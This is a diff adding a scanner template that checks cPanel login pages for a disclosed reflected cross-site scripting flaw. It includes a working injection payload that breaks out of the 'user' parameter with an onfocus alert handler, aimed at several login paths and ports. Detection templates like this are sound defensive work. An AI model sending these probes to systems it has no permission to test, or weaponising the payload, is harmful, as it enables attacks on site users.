@@ -1,0 +1,34 @@
+id: TSR-2021-0005
+
+info:
+  name: XSS CPANEL https://forums.cpanel.net/threads/cpanel-tsr-2021-0005-full-disclosure.693853/
+  author: osamahamad
+  severity: low
+  tags: xss
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/login?user=sth%22+onfocus=%22alert()%22+id=%22xss%22+%22%ff#xss"
+      - "{{BaseURL}}/cpanel/login?user=sth%22+onfocus=%22alert()%22+id=%22xss%22+%22%ff#xss"
+      - "{{BaseURL}}:2082/login?user=sth%22+onfocus=%22alert()%22+id=%22xss%22+%22%ff#xss"
+      - "{{BaseURL}}:2083/login?user=sth%22+onfocus=%22alert()%22+id=%22xss%22+%22%ff#xss"
+      - "http://cpanel.{{Hostname}}/login?user=sth%22+onfocus=%22alert()%22+id=%22xss%22+%22%ff#xss"
+      - "https://cpanel.{{Hostname}}/login?user=sth%22+onfocus=%22alert()%22+id=%22xss%22+%22%ff#xss"
+      - "http://cpanel.{{Hostname}}:2082/login?user=sth%22+onfocus=%22alert()%22+id=%22xss%22+%22%ff#xss"
+      - "https://cpanel.{{Hostname}}:2083/login?user=sth%22+onfocus=%22alert()%22+id=%22xss%22+%22%ff#xss"
+
+    threads: 8
+    redirects: true
+    max-redirects: 1
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "onfocus=\"alert()"
+        part: body
+
+      - type: word
+        words:
+          - "text/html"
+        part: header
